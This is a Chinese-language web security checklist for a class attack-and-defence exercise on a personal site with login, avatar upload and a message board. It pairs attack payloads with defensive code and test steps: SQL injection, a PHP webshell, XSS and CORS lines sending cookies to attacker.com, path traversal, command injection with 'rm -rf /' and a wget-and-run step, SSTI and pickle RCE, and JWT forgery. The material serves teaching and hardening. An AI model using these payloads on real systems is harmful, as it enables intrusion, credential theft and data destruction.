# 個人網站安全檢驗清單
> 基於 PortSwigger Web Security Academy 全分類，針對本次期中個人網站攻防設計
> 網站功能：登入/註冊、頭貼上傳、留言板

---

## 使用方式
每項檢查完畢後標記 ✅ 或 ❌（有漏洞）。
優先修復標記 🔴 的項目，這些是最容易被同學攻擊的點。

---

## 🔴 1. SQL Injection（SQL 注入）

### 攻擊方式
```
# 登入繞過
username: admin' OR '1'='1
password: anything

# 取得所有使用者資料
username: ' UNION SELECT username, password, avatar FROM users--

# 確認資料庫版本
username: ' OR 1=1 ORDER BY 3--

# Blind SQL Injection（猜密碼）
username: admin' AND SUBSTR(password,1,1)='a'--
```

### 攻擊目標
- 登入表單（username / password 欄位）
- 留言搜尋功能
- 任何帶參數的 API：`/api/user?id=1`

### 防禦實作
```python
# ❌ 危險：字串拼接
cursor.execute(f"SELECT * FROM users WHERE username='{username}'")

# ✅ 安全：Parameterized Query
cursor.execute("SELECT * FROM users WHERE username=?", (username,))

# ✅ 更好：使用 ORM（SQLAlchemy）
user = db.query(User).filter(User.username == username).first()
```

### 檢驗步驟
- [ ] 登入欄位輸入 `' OR '1'='1` 是否能繞過
- [ ] 登入欄位輸入 `admin'--` 是否能繞過
- [ ] API 參數輸入 `1 OR 1=1` 是否回傳異常資料
- [ ] 錯誤訊息是否洩漏 SQL 語法

---

## 🔴 2. File Upload Vulnerabilities（檔案上傳漏洞）

### 攻擊方式
```
# 上傳 PHP Webshell（偽裝成圖片）
檔名：shell.php
內容：<?php system($_GET['cmd']); ?>

# 繞過副檔名檢查
shell.php.jpg
shell.PHP
shell.php%00.jpg      # null byte injection
shell.phtml
shell.php5

# 繞過 Content-Type 檢查
Content-Type: image/jpeg（但內容是 PHP）

# 多重副檔名
shell.jpg.php

# 上傳 .htaccess 修改伺服器行為
AddType application/x-httpd-php .jpg
```

### 攻擊成功後
```
GET /uploads/shell.php?cmd=id
GET /uploads/shell.php?cmd=cat+/etc/passwd
GET /uploads/shell.php?cmd=cat+config.py
```

### 防禦實作
```python
import imghdr, uuid, os
from PIL import Image

ALLOWED_EXTENSIONS = {'.jpg', '.jpeg', '.png'}
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB

def validate_and_save_upload(file):
    # 1. 檢查副檔名
    ext = os.path.splitext(file.filename)[1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        raise ValueError("不允許的檔案格式")

    content = file.read()

    # 2. 檢查 magic bytes（真正的檔案型別）
    file_type = imghdr.what(None, content)
    if file_type not in ['jpeg', 'png']:
        raise ValueError("檔案內容不是圖片")

    # 3. 用 Pillow 重新處理（消滅嵌入的惡意碼）
    from io import BytesIO
    img = Image.open(BytesIO(content))
    img.verify()  # 若不是真圖片會 raise

    # 4. 用 UUID 重新命名，不用原始檔名
    safe_filename = f"{uuid.uuid4()}.jpg"

    # 5. 存到 web root 以外的目錄
    save_path = os.path.join("/var/uploads", safe_filename)  # 不在 /static 下
    img.save(save_path)

    return safe_filename
```

```nginx
# nginx：上傳目錄禁止執行
location /uploads/ {
    add_header Content-Type image/jpeg;
    location ~* \.(php|py|sh|pl|cgi)$ {
        deny all;
    }
}
```

### 檢驗步驟
- [ ] 上傳 `.php` 副檔名是否被拒絕
- [ ] 上傳 `shell.php.jpg` 是否被正確拒絕
- [ ] 上傳內含 PHP 語法但副檔名為 `.jpg` 是否被拒絕（magic bytes 檢查）
- [ ] 上傳後的檔案是否可以被直接存取執行
- [ ] 上傳目錄是否在 web root 外或禁止執行
- [ ] 是否限制了檔案大小上限

---

## 🔴 3. Cross-Site Scripting (XSS)

### 攻擊方式
```html
<!-- Stored XSS：留言板注入，影響所有訪客 -->
<script>document.location='https://attacker.com/?c='+document.cookie</script>
<script>fetch('https://attacker.com',{method:'POST',body:document.cookie})</script>

<!-- 繞過簡單過濾 -->
<img src=x onerror="alert(document.cookie)">
<svg onload="alert(1)">
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<input onfocus=alert(1) autofocus>

<!-- 繞過 script 關鍵字過濾 -->
<scr<script>ipt>alert(1)</scr</script>ipt>
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

<!-- 竊取 session cookie -->
<script>
  var i=new Image();
  i.src='https://attacker.com/steal?c='+encodeURIComponent(document.cookie);
</script>
```

### 防禦實作
```python
# 後端：用 bleach sanitize 留言內容
import bleach

def sanitize_message(content):
    # 只允許純文字，移除所有 HTML tag
    return bleach.clean(content, tags=[], strip=True)

# 或只允許特定安全 tag
ALLOWED_TAGS = ['b', 'i', 'u', 'p', 'br']
return bleach.clean(content, tags=ALLOWED_TAGS, strip=True)
```

```jsx
// 前端：React 預設會 escape，不要用 dangerouslySetInnerHTML
// ❌ 危險
<div dangerouslySetInnerHTML={{__html: message.content}} />

// ✅ 安全
<div>{message.content}</div>
```

```python
# 後端加 HTTP Security Headers
@app.middleware("http")
async def add_security_headers(request, call_next):
    response = await call_next(request)
    response.headers["Content-Security-Policy"] = "default-src 'self'; script-src 'self'"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    response.headers["X-Content-Type-Options"] = "nosniff"
    return response
```

### 檢驗步驟
- [ ] 留言板輸入 `<script>alert(1)</script>` 是否執行
- [ ] 留言板輸入 `<img src=x onerror=alert(1)>` 是否執行
- [ ] 是否有設定 CSP header
- [ ] Cookie 是否有設定 `HttpOnly`（防止 JS 讀取）

---

## 🔴 4. Path Traversal（目錄穿越）

### 攻擊方式
```
# 讀取系統檔案
GET /api/file?name=../../../../etc/passwd
GET /uploads/../../../../etc/passwd
GET /api/avatar?file=../config.py
GET /api/avatar?file=..%2F..%2Fetc%2Fpasswd   # URL encode
GET /api/avatar?file=....//....//etc/passwd    # 雙重 slash 繞過

# 讀取原始碼
GET /api/file?name=../main.py
GET /api/file?name=../database.db
GET /api/file?name=../.env
```

### 防禦實作
```python
import os

UPLOAD_DIR = "/var/uploads"

def get_file(filename):
    # ❌ 危險
    return open(f"./uploads/{filename}").read()

    # ✅ 安全：確認最終路徑在允許目錄內
    safe_path = os.path.realpath(os.path.join(UPLOAD_DIR, filename))
    if not safe_path.startswith(UPLOAD_DIR):
        raise PermissionError("Access denied")
    return open(safe_path, 'rb').read()

    # 更簡單：只用 basename，忽略所有路徑資訊
    safe_name = os.path.basename(filename)
    return open(os.path.join(UPLOAD_DIR, safe_name), 'rb').read()
```

### 檢驗步驟
- [ ] `/api/file?name=../../../../etc/passwd` 是否被擋下
- [ ] URL encode 版本 `%2F%2F` 是否也被擋下
- [ ] 所有接受檔名的 API 是否都有 `os.path.basename()` 保護

---

## 🔴 5. Authentication（身份驗證漏洞）

### 攻擊方式
```
# 暴力破解登入
for password in wordlist:
    POST /login {"username": "admin", "password": password}

# 帳號列舉（根據錯誤訊息判斷帳號是否存在）
# 若「帳號不存在」和「密碼錯誤」是不同訊息，可以列舉所有帳號

# 預測 session token
# 若 token 是 user_id_timestamp 這種可預測格式，可以偽造

# 密碼重設漏洞
POST /reset-password {"token": "123456"}  # 猜 6 位數 token
```

### 防禦實作
```python
from passlib.hash import bcrypt
from slowapi import Limiter
import secrets

# 密碼 hash
def hash_password(password: str) -> str:
    return bcrypt.hash(password)

def verify_password(password: str, hashed: str) -> bool:
    return bcrypt.verify(password, hashed)

# Rate limiting（FastAPI + slowapi）
limiter = Limiter(key_func=get_remote_address)

@app.post("/login")
@limiter.limit("5/minute")  # 每分鐘最多 5 次
async def login(request: Request, ...):
    ...

# Session token 要夠隨機
session_token = secrets.token_hex(32)

# 統一錯誤訊息（不洩漏帳號是否存在）
# ❌ 危險
if not user: return "帳號不存在"
if not verify_password: return "密碼錯誤"

# ✅ 安全
return "帳號或密碼錯誤"
```

### 檢驗步驟
- [ ] 密碼是否用 bcrypt 儲存（非明文、非 MD5）
- [ ] 登入失敗訊息是否統一（不洩漏帳號存在與否）
- [ ] 是否有 rate limiting 防止暴力破解
- [ ] Session token 是否足夠隨機（至少 32 bytes）
- [ ] 登入後是否重新產生 session（防 session fixation）

---

## 🟠 6. Access Control（存取控制 / IDOR）

### 攻擊方式
```
# IDOR：用自己的帳號存取別人的資源
GET /api/user/1        # 我是 user/5，嘗試看 user/1 的資料
DELETE /api/message/3  # 刪除別人的留言
GET /api/avatar/3.jpg  # 看別人的頭貼（若有私人頭貼）

# 水平越權（Horizontal Privilege Escalation）
# 用普通帳號存取另一個普通帳號的資料

# 垂直越權（Vertical Privilege Escalation）
POST /api/admin/delete-user  # 普通用戶呼叫管理員 API
```

### 防禦實作
```python
# 每個需要身份的 API 都要驗證資源歸屬
@app.delete("/api/message/{message_id}")
async def delete_message(message_id: int, current_user = Depends(get_current_user)):
    message = db.query(Message).filter(Message.id == message_id).first()

    if not message:
        raise HTTPException(404)

    # ❌ 危險：沒有驗證是否是自己的留言
    # db.delete(message)

    # ✅ 安全：確認是自己的留言才能刪
    if message.user_id != current_user.id:
        raise HTTPException(403, "無權限")

    db.delete(message)
```

### 檢驗步驟
- [ ] 刪除留言 API 是否驗證留言是自己的
- [ ] 修改個人資料 API 是否驗證是自己的帳號
- [ ] 是否有未保護的管理員路由（`/admin`, `/api/admin`）
- [ ] 未登入時存取需要登入的 API 是否被擋下

---

## 🟠 7. Server-Side Template Injection (SSTI)

### 攻擊方式
```
# 偵測（在留言板或任何輸入欄位嘗試）
{{7*7}}          → 若頁面顯示 49，有 SSTI
${7*7}           → Freemarker / Thymeleaf
<%= 7*7 %>       → ERB

# Jinja2 RCE（取得伺服器控制權）
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```

### 防禦實作
```python
# ❌ 危險：把使用者輸入傳進 render_template_string
from flask import render_template_string
@app.route('/message')
def show_message():
    return render_template_string(user_message)  # 絕對不能這樣做！

# ✅ 安全：固定模板，使用者輸入只作為變數
return render_template('message.html', content=user_message)

# ✅ 在模板中正確引用（Jinja2 自動 escape）
# message.html
# <p>{{ content }}</p>   ← 安全，Jinja2 會 escape
# <p>{{ content|safe }}</p>  ← 危險！不要用 |safe
```

### 檢驗步驟
- [ ] 留言板輸入 `{{7*7}}` 頁面是否顯示 `49`
- [ ] 是否有任何地方使用 `render_template_string()` 接受使用者輸入
- [ ] 模板中是否有用 `|safe` filter（危險）

---

## 🟠 8. Information Disclosure（資訊洩漏）

### 攻擊方式
```
# 嘗試存取敏感檔案
GET /.env
GET /.git/config
GET /.git/HEAD
GET /config.py
GET /database.db
GET /backup.sql
GET /requirements.txt     # 知道後端框架版本，找已知漏洞

# 錯誤訊息洩漏
# 觸發 500 error 看 stack trace
POST /login {"username": "a'", "password": "b"}  # 觸發 SQL error

# 目錄列舉
GET /uploads/             # 若沒有 index，會列出所有上傳檔案
GET /static/

# HTTP headers 洩漏
# Server: Python/3.9 uvicorn   → 知道版本找 CVE
# X-Powered-By: Express 4.18
```

### 防禦實作
```python
# 1. Production 模式關掉 debug
app = FastAPI(debug=False)

# 2. 統一錯誤回應，不洩漏內部資訊
@app.exception_handler(Exception)
async def global_exception_handler(request, exc):
    # 記錄到 log，但不回傳給使用者
    logger.error(f"Internal error: {exc}")
    return JSONResponse({"error": "Internal Server Error"}, status_code=500)

# 3. 移除 Server header
response.headers.pop("server", None)
```

```nginx
# nginx 擋掉敏感路徑
location ~ /\. {
    deny all;  # 擋掉所有 .開頭的檔案（.env, .git）
}
location ~* \.(sql|db|log|bak|backup|env|config)$ {
    deny all;
}
# 關閉目錄列舉
autoindex off;
```

### 檢驗步驟
- [ ] `/.env` 是否可以存取
- [ ] `/.git/config` 是否可以存取
- [ ] 觸發 500 error 是否洩漏 stack trace 或 SQL 語法
- [ ] Response headers 是否洩漏框架/版本資訊
- [ ] `/uploads/` 目錄是否會列出所有檔案

---

## 🟠 9. OS Command Injection（命令注入）

### 攻擊方式
```
# 若後端用 shell 處理圖片（如壓縮、轉換）
filename = "image.jpg; rm -rf /"
filename = "image.jpg | cat /etc/passwd"
filename = "image.jpg && wget attacker.com/shell.sh && bash shell.sh"

# 在任何傳入 shell 的參數中嘗試
POST /api/resize {"filename": "a.jpg; id"}
```

### 防禦實作
```python
# ❌ 危險：用 shell 處理使用者輸入
import os
os.system(f"convert {filename} -resize 200x200 {output}")
subprocess.call(f"ffmpeg -i {filename} output.mp4", shell=True)

# ✅ 安全：用 Python library 直接處理，不呼叫 shell
from PIL import Image
img = Image.open(input_path)
img.thumbnail((200, 200))
img.save(output_path)

# 若必須用 subprocess，不要用 shell=True，且傳 list 不傳 string
subprocess.run(["convert", safe_filename, "-resize", "200x200", output], shell=False)
```

### 檢驗步驟
- [ ] 是否有任何地方使用 `os.system()` 或 `subprocess(shell=True)` 處理使用者輸入
- [ ] 圖片處理是否用 Pillow 而非 shell 命令

---

## 🟠 10. Cross-Site Request Forgery (CSRF)

### 攻擊方式
```html
<!-- 攻擊者網站放這段，誘導受害者訪問 -->
<!-- 若 cookie 沒有 SameSite，這會以受害者身份執行 -->
<form action="https://victim-site.com/api/delete-account" method="POST">
  <input type="hidden" name="confirm" value="yes">
</form>
<script>document.forms[0].submit()</script>

<!-- 或用 fetch -->
<script>
fetch('https://victim-site.com/api/message', {
  method: 'POST',
  credentials: 'include',  // 帶上 cookie
  body: JSON.stringify({content: '<script>惡意碼</script>'})
})
</script>
```

### 防禦實作
```python
# 方法一：Cookie 設 SameSite=Strict（最簡單）
response.set_cookie(
    "session",
    token,
    httponly=True,
    samesite="strict",  # 跨站請求不帶 cookie
    secure=True         # 僅 HTTPS
)

# 方法二：CSRF Token
# 每個 form 都包含一個隨機 token，後端驗證
csrf_token = secrets.token_hex(16)
session["csrf_token"] = csrf_token
# 前端 form 加上 hidden field
# 後端驗證 request 中的 token 與 session 中的一致
```

### 檢驗步驟
- [ ] Cookie 是否有設定 `SameSite=Strict` 或 `SameSite=Lax`
- [ ] Cookie 是否有設定 `HttpOnly`（防 XSS 竊取）
- [ ] 重要操作（刪除帳號、改密碼）是否有 CSRF 保護

---

## 🟠 11. JWT Attacks（JWT 漏洞）

### 攻擊方式
```python
# 攻擊一：Algorithm None（把簽名去掉）
header = base64({"alg": "none", "typ": "JWT"})
payload = base64({"user_id": 1, "role": "admin"})
token = f"{header}.{payload}."  # 空簽名

# 攻擊二：弱 secret 暴力破解
# 用 hashcat 或 jwt_tool 暴力破解 HS256 secret
# 若 secret 是 "secret" 或 "password" 等常見字串

# 攻擊三：修改 payload 提升權限
# 解碼 JWT，把 {"role": "user"} 改成 {"role": "admin"}，重新簽名
```

### 防禦實作
```python
import jwt, secrets

SECRET_KEY = secrets.token_hex(32)  # 隨機強 secret，不要寫死

def create_token(user_id: int):
    return jwt.encode(
        {"user_id": user_id, "exp": datetime.utcnow() + timedelta(hours=1)},
        SECRET_KEY,
        algorithm="HS256"  # 明確指定，不接受 none
    )

def verify_token(token: str):
    try:
        return jwt.decode(
            token,
            SECRET_KEY,
            algorithms=["HS256"]  # 白名單，不接受其他演算法
        )
    except jwt.ExpiredSignatureError:
        raise HTTPException(401, "Token 已過期")
    except jwt.InvalidTokenError:
        raise HTTPException(401, "無效 Token")
```

### 檢驗步驟
- [ ] JWT secret 是否足夠隨機（至少 32 bytes）
- [ ] 是否明確指定接受的演算法（`algorithms=["HS256"]`）
- [ ] JWT 是否有設定過期時間 `exp`
- [ ] Secret 是否存在 `.env` 而非寫死在程式碼中

---

## 🟡 12. Server-Side Request Forgery (SSRF)

### 攻擊方式
```
# 若網站有「從 URL 載入圖片」等功能
POST /api/load-image {"url": "http://169.254.169.254/latest/meta-data/"}  # AWS metadata
POST /api/load-image {"url": "http://localhost:8080/admin"}  # 存取內部服務
POST /api/load-image {"url": "file:///etc/passwd"}  # 讀本機檔案
```

### 防禦實作
```python
import ipaddress, socket

def is_safe_url(url: str) -> bool:
    from urllib.parse import urlparse
    parsed = urlparse(url)

    # 只允許 http/https
    if parsed.scheme not in ['http', 'https']:
        return False

    # 解析 IP，擋掉內網地址
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            return False
    except:
        return False

    return True
```

### 檢驗步驟
- [ ] 網站是否有接受 URL 並發出請求的功能
- [ ] 若有，是否驗證 URL 不指向內網地址

---

## 🟡 13. Insecure Deserialization（不安全的反序列化）

### 攻擊方式
```python
# 若後端用 pickle 序列化 session 或資料
import pickle, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
# 把 payload 送到任何接受序列化資料的地方
```

### 防禦實作
```python
# ❌ 危險：用 pickle 處理使用者資料
data = pickle.loads(user_input)

# ✅ 安全：只用 JSON
import json
data = json.loads(user_input)

# 若要存 session：用 JWT 或 signed cookie（itsdangerous）
from itsdangerous import URLSafeTimedSerializer
s = URLSafeTimedSerializer(SECRET_KEY)
token = s.dumps({"user_id": 1})
data = s.loads(token, max_age=3600)
```

### 檢驗步驟
- [ ] 是否有任何地方使用 `pickle.loads()` 處理外部資料
- [ ] Session 資料是否安全地簽名/加密

---

## 🟡 14. Race Conditions（競態條件）

### 攻擊方式
```
# 同時送出多個請求，繞過「只能做一次」的限制
# 例如：同時送出多個「兌換優惠碼」請求
# 或同時送出多個「上傳頭貼」請求，可能導致檔案混亂

import threading
def register(username):
    requests.post('/register', json={"username": username, ...})

# 同時 100 個請求建立同一個帳號
threads = [threading.Thread(target=register, args=("admin",)) for _ in range(100)]
```

### 防禦實作
```python
# 資料庫層面加唯一限制
class User(Base):
    __tablename__ = "users"
    username = Column(String, unique=True)  # 資料庫唯一約束

# 操作前用資料庫鎖
from sqlalchemy import select, update
with db.begin():
    user = db.execute(select(User).where(User.id == id).with_for_update()).scalar()
    # 安全地修改
```

### 檢驗步驟
- [ ] 資料庫 username 欄位是否有 unique constraint
- [ ] 同時送 100 個請求能否建立重複帳號

---

## 🟡 15. HTTP Host Header Attacks

### 攻擊方式
```
# 修改 Host header，可能影響密碼重設連結
POST /reset-password
Host: attacker.com

# 若後端用 Host header 產生連結，受害者收到的連結會指向攻擊者網站
# 密碼重設 email：Click here: https://attacker.com/reset?token=xxx
```

### 防禦實作
```python
# 不要用 request.headers["host"] 產生連結
# 改用設定檔中寫死的 domain
DOMAIN = "https://yourdomain.com"
reset_link = f"{DOMAIN}/reset?token={token}"
```

### 檢驗步驟
- [ ] 密碼重設連結是否使用固定 domain 而非 Host header

---

## 🟡 16. NoSQL Injection

### 攻擊方式
```
# 若使用 MongoDB 等 NoSQL 資料庫
POST /login
{"username": {"$gt": ""}, "password": {"$gt": ""}}
# $gt 代表「大於空字串」，等於 SELECT * WHERE username > "" → 所有帳號

{"username": "admin", "password": {"$regex": ".*"}}
```

### 防禦
- 使用 ODM（Mongoose 等）而非直接拼查詢
- 驗證輸入型別（確保是 string，不是 object）

---

## 🟡 17. CORS Misconfiguration（跨來源資源共用設定錯誤）

### 攻擊方式
```javascript
// 若 API 設了 Access-Control-Allow-Origin: *
// 攻擊者網站可以用 JS 讀取受害者登入後的 API 回應

fetch('https://victim-site.com/api/profile', {credentials: 'include'})
  .then(r => r.json())
  .then(data => fetch('https://attacker.com/steal', {method:'POST', body: JSON.stringify(data)}))
```

### 防禦實作
```python
# 只允許特定 origin
from fastapi.middleware.cors import CORSMiddleware

app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://yourdomain.com"],  # ❌ 不要用 ["*"]
    allow_credentials=True,
    allow_methods=["GET", "POST", "DELETE"],
    allow_headers=["*"],
)
```

### 檢驗步驟
- [ ] CORS 是否只允許自己的 domain，不是 `*`
- [ ] 允許 `credentials: true` 時是否絕對沒有 `Allow-Origin: *`

---

## 🟡 18. Clickjacking

### 攻擊方式
```html
<!-- 把你的網站放在 iframe 裡，疊上透明層誘導點擊 -->
<iframe src="https://victim-site.com/delete-account" style="opacity:0; position:absolute;"></iframe>
<button style="position:absolute; top:...">點我領獎品</button>
```

### 防禦
```python
# 加上 X-Frame-Options header
response.headers["X-Frame-Options"] = "DENY"
# 或用 CSP
response.headers["Content-Security-Policy"] = "frame-ancestors 'none'"
```

---

## 🟡 19. Business Logic Vulnerabilities（商業邏輯漏洞）

### 攻擊方式
- 上傳頭貼時，上傳超大檔案（1GB）塞爆硬碟
- 留言板輸入超長字串（100萬字），塞爆資料庫
- 留言板灌入大量留言（API 沒有 rate limit）
- 嘗試刪除不屬於自己的留言

### 防禦實作
```python
# 欄位長度限制（資料庫 + API 雙層）
class Message(Base):
    content = Column(String(1000))  # 資料庫限制

@app.post("/api/message")
async def post_message(content: str = Form(..., max_length=1000)):  # API 限制
    ...

# 檔案大小限制
MAX_UPLOAD_SIZE = 5 * 1024 * 1024  # 5MB
if len(await file.read()) > MAX_UPLOAD_SIZE:
    raise HTTPException(400, "檔案過大")
```

---

## ✅ Security Headers 完整清單

後端一次性加上這些 header：

```python
@app.middleware("http")
async def security_headers(request, call_next):
    response = await call_next(request)
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline' fonts.googleapis.com; "
        "font-src fonts.gstatic.com; "
        "img-src 'self' data:; "
        "frame-ancestors 'none'"
    )
    response.headers.pop("server", None)  # 移除框架版本資訊
    return response
```

---

## ✅ 最終上線前檢查清單

### 程式碼層面
- [ ] 所有 SQL 查詢使用 ORM 或 parameterized query
- [ ] 檔案上傳有三層驗證（副檔名 + magic bytes + Pillow 重處理）
- [ ] 上傳檔案重新命名（UUID），不用原始檔名
- [ ] 上傳目錄在 web root 外，或 nginx 禁止執行
- [ ] 所有留言/輸入內容 sanitize（bleach.clean）
- [ ] 前端不用 `dangerouslySetInnerHTML`
- [ ] 密碼使用 bcrypt hash
- [ ] JWT secret 隨機且存在 .env
- [ ] Cookie 設定 `HttpOnly=True, SameSite=Strict`
- [ ] 每個 API 驗證資源歸屬（防 IDOR）
- [ ] 所有接受檔名的地方用 `os.path.basename()`
- [ ] 沒有使用 `pickle.loads()` 處理外部資料
- [ ] 沒有使用 `os.system()` 或 `shell=True` 處理使用者輸入
- [ ] 圖片處理用 Pillow，不呼叫 shell 命令
- [ ] Debug 模式關閉
- [ ] 統一 500 錯誤回應，不回傳 stack trace

### Rate Limiting
- [ ] 登入 API：每 IP 每分鐘最多 10 次
- [ ] 留言 API：每用戶每分鐘最多 20 次
- [ ] 上傳 API：每用戶每分鐘最多 5 次

### 伺服器/Nginx 層面
- [ ] `.env`、`.git`、`.sql`、`.db` 等敏感路徑被擋下
- [ ] `autoindex off`（關閉目錄列舉）
- [ ] 上傳目錄禁止執行 PHP/Python/Shell 腳本
- [ ] Security headers 全部設定
- [ ] HTTPS（若可以）

### 測試
- [ ] 用 `sqlmap` 掃描登入表單（可用 `--level=3`）
- [ ] 嘗試上傳 `shell.php`、`shell.php.jpg`
- [ ] 在留言板輸入 `<script>alert(1)</script>` 和 `{{7*7}}`
- [ ] 嘗試存取 `/.env`、`/.git/config`
- [ ] 嘗試 `../../../etc/passwd` 路徑穿越
- [ ] 用另一個帳號嘗試刪除第一個帳號的留言

---

## 攻擊期間（4/22–4/29）監控建議

```python
# 在後端 log 可疑行為
import logging

logger = logging.getLogger(__name__)

@app.middleware("http")
async def log_suspicious(request, call_next):
    body = await request.body()
    suspicious_patterns = ["../", "<script", "SELECT ", "UNION ", "<?php", "{{", "${"]
    body_str = body.decode('utf-8', errors='ignore')

    if any(p.lower() in body_str.lower() for p in suspicious_patterns):
        logger.warning(f"[SUSPICIOUS] {request.client.host} {request.method} {request.url} - {body_str[:200]}")

    return await call_next(request)
```

---

*最後更新：2026-04-17 | 基於 PortSwigger Web Security Academy 全分類*
